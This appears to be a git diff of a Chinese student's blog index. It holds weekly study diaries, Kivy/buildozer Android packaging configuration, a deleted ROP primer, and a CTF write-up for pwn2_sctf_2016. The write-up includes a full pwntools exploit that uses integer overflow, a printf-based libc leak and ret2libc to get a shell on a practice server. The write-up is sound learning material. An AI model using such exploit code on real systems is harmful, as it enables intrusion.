libs/android-v8/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_x86 = libs/android-x86/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_mips = libs/android-mips/*.so</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate whether the screen should stay on</span></span><br><span class="line"><span class="meta"># Don&#x27;t forget to add the WAKE_LOCK permission if you set this to True</span></span><br><span class="line"><span class="meta">#android.wakelock = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android application meta-data to set (key=value format)</span></span><br><span class="line"><span class="meta">#android.meta_data =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android library project to add (will be added in the</span></span><br><span class="line"><span class="meta"># project.properties automatically.)</span></span><br><span class="line"><span class="meta">#android.library_references =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android shared libraries which will be added to AndroidManifest.xml using &lt;uses-library&gt; tag</span></span><br><span class="line"><span class="meta">#android.uses_library =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android logcat filters to use</span></span><br><span class="line"><span class="meta">#android.logcat_filters = *:S python:D</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Copy library instead of making a libpymodules.so</span></span><br><span class="line"><span class="meta">#android.copy_libs = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64</span></span><br><span class="line">android.arch = armeabi-v7a</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) overrides automatic versionCode computation (used in build.gradle)</span></span><br><span class="line"><span class="meta"># this is not the same as app version and should only be edited if you know what you&#x27;re doing</span></span><br><span class="line"><span class="meta"># android.numeric_version = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) enables Android auto backup feature (Android API &gt;=23)</span></span><br><span class="line">android.allow_backup = True</span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) XML file for custom backup rules (see official auto backup documentation)</span></span><br><span class="line"><span class="meta">#android.backup_rules =</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) If you need to insert variables into your AndroidManifest.xml file,</span></span><br><span class="line"><span class="meta">#you can do so with the manifestPlaceholders property.</span></span><br><span class="line"><span class="meta">#This property takes a map of key-value pairs. (via a string)</span></span><br><span class="line"><span class="meta">#Usage example : android.manifest_placeholders = [myCustomUrl:&quot;org.kivy.customurl&quot;]</span></span><br><span class="line"><span class="meta">#android.manifest_placeholders = [:]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) disables the compilation of py to pyc/pyo files when packaging</span></span><br><span class="line"><span class="meta">#android.no-compile-pyo = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Python for android (p4a) specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android fork to use, defaults to upstream (kivy)</span></span><br><span class="line"><span class="meta">#p4a.fork = kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android branch to use, defaults to master</span></span><br><span class="line"><span class="meta">#p4a.branch = master</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android git clone directory (if empty, it will be automatically cloned from github)</span></span><br><span class="line"><span class="meta">#p4a.source_dir =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The directory in which python-for-android should look for your own build recipes (if any)</span></span><br><span class="line"><span class="meta">#p4a.local_recipes =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename to the hook for p4a</span></span><br><span class="line"><span class="meta">#p4a.hook =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Bootstrap to use for android builds</span></span><br><span class="line"><span class="meta"># p4a.bootstrap = sdl2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) port number to specify an explicit --port= p4a argument (eg for bootstrap flask)</span></span><br><span class="line"><span class="meta">#p4a.port =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Control passing the --use-setup-py vs --ignore-setup-py to p4a</span></span><br><span class="line"><span class="meta"># &quot;in the future&quot; --use-setup-py is going to be the default behaviour in p4a, right now it is not</span></span><br><span class="line"><span class="meta"># Setting this to false will pass --ignore-setup-py, true will pass --use-setup-py</span></span><br><span class="line"><span class="meta"># NOTE: this is general setuptools integration, having pyproject.toml is enough, no need to generate</span></span><br><span class="line"><span class="meta"># setup.py if you&#x27;re using Poetry, but you need to add &quot;toml&quot; to source.include_exts.</span></span><br><span class="line"><span class="meta">#p4a.setup_py = false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># iOS specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom kivy-ios folder</span></span><br><span class="line"><span class="meta">#ios.kivy_ios_dir = ../kivy-ios</span></span><br><span class="line"><span class="meta"># Alternately, specify the URL and branch of a git checkout:</span></span><br><span class="line">ios.kivy_ios_url = https:<span class="comment">//github.com/kivy/kivy-ios</span></span><br><span class="line">ios.kivy_ios_branch = master</span><br><span class="line"></span><br><span class="line"><span class="meta"># Another platform dependency: ios-deploy</span></span><br><span class="line"><span class="meta"># Uncomment to use a custom checkout</span></span><br><span class="line"><span class="meta">#ios.ios_deploy_dir = ../ios_deploy</span></span><br><span class="line"><span class="meta"># Or specify URL and branch</span></span><br><span class="line">ios.ios_deploy_url = https:<span class="comment">//github.com/phonegap/ios-deploy</span></span><br><span class="line">ios.ios_deploy_branch = <span class="number">1.10</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Whether or not to sign the code</span></span><br><span class="line">ios.codesign.allowed = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the debug version</span></span><br><span class="line"><span class="meta"># Get a list of available identities: buildozer ios list_identities</span></span><br><span class="line"><span class="meta">#ios.codesign.debug = &quot;iPhone Developer: &lt;lastname&gt; &lt;firstname&gt; (&lt;hexstring&gt;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the release version</span></span><br><span class="line"><span class="meta">#ios.codesign.release = %(ios.codesign.debug)s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[buildozer]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))</span></span><br><span class="line">log_level = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Display warning if buildozer is run as root (0 = False, 1 = True)</span></span><br><span class="line">warn_on_root = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build artifact storage, absolute or relative to spec file</span></span><br><span class="line"><span class="meta"># build_dir = ./.buildozer</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build output (i.e. .apk, .ipa) storage</span></span><br><span class="line"><span class="meta"># bin_dir = ./bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    List as sections</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can define all the &quot;list&quot; as [section:key].</span></span><br><span class="line"><span class="meta">#    Each line will be considered as a option to the list.</span></span><br><span class="line"><span class="meta">#    Let&#x27;s take [app] / source.exclude_patterns.</span></span><br><span class="line"><span class="meta">#    Instead of doing:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app]</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,data/audio/*.wav,data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    This can be translated into:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns]</span></span><br><span class="line"><span class="meta">#license</span></span><br><span class="line"><span class="meta">#data/audio/*.wav</span></span><br><span class="line"><span class="meta">#data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    Profiles</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can extend section / key with a profile</span></span><br><span class="line"><span class="meta">#    For example, you want to deploy a demo version of your application without</span></span><br><span class="line"><span class="meta">#    HD content. You could first change the title to add &quot;(demo)&quot; in the name</span></span><br><span class="line"><span class="meta">#    and extend the excluded directories to remove the HD content.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app@demo]</span></span><br><span class="line"><span class="meta">#title = My Application (demo)</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns@demo]</span></span><br><span class="line"><span class="meta">#images/hd/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    Then, invoke the command line with the &quot;demo&quot; profile:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#buildozer --profile demo android debug</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="hgamectf2022开赛"><a href="#hgamectf2022开赛" class="headerlink" title="hgamectf2022开赛"></a>hgamectf2022开赛</h2><ul>
+<li>这两天的hgamectf2022也开始了，题目很新颖，我也学到了不少，但是作为一个pwn手吧，比较丢脸的就是一个pwn题都没做出来，虽然其他方向的题目出了不少，也成功挤进前一百名，但这只是暂时的，我还需要继续努力，把自己的主方向强大起来！</li>
+<li>留个图嘿嘿，最高排到39名好像</li>
+</ul>
+<p><img src="/img/1643119698683.png" alt="1643119698683"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>这一周收获还是挺多的，学会了buildozer打包，见识了新的ctf题型，又下了两个新软件，真的是活到老学到老，只有不断的学习，才不会落后，冲冲冲！</li>
+<li>下周好像要开始大一新生的培训了，预计寒假结束还是会给他们进行一个考核赛，这就涉及到需要我们出题，到时候时间会越来越紧，不过这样也过得充实！这个寒假这样过才不算荒废！</li>
+</ul>
+]]></content>
+      <categories>
+        <category>2022</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>寒假学习(二)</title>
     <url>/2022/01/30/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%882022.1.24-2022.1.30%EF%BC%89/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1004,41 +1041,77 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>基本ROP</title>
-    <url>/2021/06/20/%E5%9F%BA%E6%9C%ACROP/</url>
-    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
-<pre><code>程序存在溢出，并且可以控制返回地址。
-
-可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
-</code></pre>
-<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
-<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
-<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>飞蓬大将军</title>
-    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
+    <title>寒假学习(三)</title>
+    <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
     <content><![CDATA[<span id="more"></span>
-<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
-<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
+<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
+<ol>
+<li><p>文件名称</p>
+<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
+</li>
+<li><p>绝对路径</p>
+<p>在配置文件里，main.py的路径一定要填写正确</p>
+</li>
+<li><p>配置要求</p>
+<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
+</li>
+<li><p>source.include_exts</p>
+<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
+</li>
+<li><p>网络要求</p>
+<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
+</li>
+</ol>
+<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
+<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
 ]]></content>
       <categories>
-        <category>日常闲话</category>
+        <category>2022</category>
       </categories>
       <tags>
         <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn2_sctf_2016</title>
+    <url>/2021/07/06/pwn2-sctf-2016/</url>
+    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
+<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
+<p>尝试运行了一下</p>
+<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
+<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
+<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
+<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
+<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
+<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
+<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
+<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
+<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
+<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
+<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>泄露libc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>
+
+<p>算出system和’/bin/sh’的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>覆盖返回地址，夺权</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1114,97 +1187,24 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>寒假学习(一)</title>
-    <url>/2022/01/22/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%882022.1.17-2022.1.23%EF%BC%89/</url>
+    <title>pwnable_orw</title>
+    <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
     <content><![CDATA[<span id="more"></span>
-<h1 id="学习进度总结（一）（2022-1-17-2022-1-23）"><a href="#学习进度总结（一）（2022-1-17-2022-1-23）" class="headerlink" title="学习进度总结（一）（2022.1.17-2022.1.23）"></a>学习进度总结（一）（2022.1.17-2022.1.23）</h1><h2 id="作品赛项目Begin"><a href="#作品赛项目Begin" class="headerlink" title="作品赛项目Begin"></a>作品赛项目Begin</h2><p>13号回家后休息了两天就开始着手正事——创新实践作品赛</p>
-<ul>
-<li><p>第一次做作品赛项目，说实在的挺无从下手，因为什么经验也没有，先就是组队问题，既然说要实验室成员组队优先，那就熟人组队了。</p>
-</li>
-<li><p>组好队后开始讨论作品内容，商量半天想到了三个比较好的方案，最后经过讨论，确定下来题目：<strong>手机诈骗钓鱼软件的伪通讯录及ip地址生成</strong></p>
-</li>
-<li><p>内容确定，大致是要做一个手机app，于是第一个碰上的比较陌生的问题就是安卓打包，我们决定主要用python语言进行编写，找到最好的就是用python的kivy库进行编写，正好有配套的buildozer可以进行软件打包</p>
-</li>
-<li><p>说干就干，队伍分工，首先让我这个擅长debug的开始着手外包工作，软件打包。果不其然，一开始下载好buildozer就开始报错了，全是bug，一片红，可给我看得头大，慢慢debug吧，是个漫长的过程</p>
-</li>
-<li><p>经过两天两夜的辛苦debug，遇到最后一个最大的问题就是打包后的软件下载后打开闪退，终于在第三天，传来捷报！外包成功了，进度+1<del>哈哈哈哈</del>！</p>
-</li>
-<li><p>最强指令：</p>
-<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">buildozer </span>-v <span class="keyword">android </span><span class="built_in">debug</span> run</span><br></pre></td></tr></table></figure></li>
-<li><p> 留下buildozer.spec文件的配置 </p>
-</li>
-</ul>
-<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">[app]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Title of your application</span></span><br><span class="line">title = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package name</span></span><br><span class="line">package.name = myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package domain (needed for android/ios packaging)</span></span><br><span class="line">package.domain = org.myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Source code where the main.py live</span></span><br><span class="line">source.dir = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to include (let empty to include all the files)</span></span><br><span class="line">source.include_exts = py,png,jpg,kv,atlas</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of inclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.include_patterns = assets/*,images/*.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_exts = spec</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of directory to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_dirs = tests, bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of exclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,images/*/*.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 1)</span></span><br><span class="line">version = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 2)</span></span><br><span class="line"><span class="meta"># version.regex = __version__ = [&#x27;&quot;](.*)[&#x27;&quot;]</span></span><br><span class="line"><span class="meta"># version.filename = %(source.dir)s/main.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Application requirements</span></span><br><span class="line"><span class="meta"># comma separated e.g. requirements = sqlite3,kivy</span></span><br><span class="line">requirements = hostpython3, libffi, openssl, sdl2_image, sdl2_mixer, sdl2_ttf, sqlite3, python3, sdl2, setuptools, six, pyjnius, android, kivy, requests, kivy.app, certifi</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Custom source folders for requirements</span></span><br><span class="line"><span class="meta"># Sets custom source for any requirements with recipes</span></span><br><span class="line"><span class="meta"># requirements.source.kivy = ../../kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Garden requirements</span></span><br><span class="line"><span class="meta">#garden_requirements =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Presplash of the application</span></span><br><span class="line"><span class="meta">#presplash.filename = %(source.dir)s/data/presplash.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Icon of the application</span></span><br><span class="line"><span class="meta">#icon.filename = %(source.dir)s/icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)</span></span><br><span class="line">orientation = portrait</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of service to declare</span></span><br><span class="line"><span class="meta">#services = NAME:ENTRYPOINT_TO_PY,NAME2:ENTRYPOINT2_TO_PY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># OSX Specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># author = © Copyright Info</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># change the major version of python used by the app</span></span><br><span class="line">osx.python_version = <span 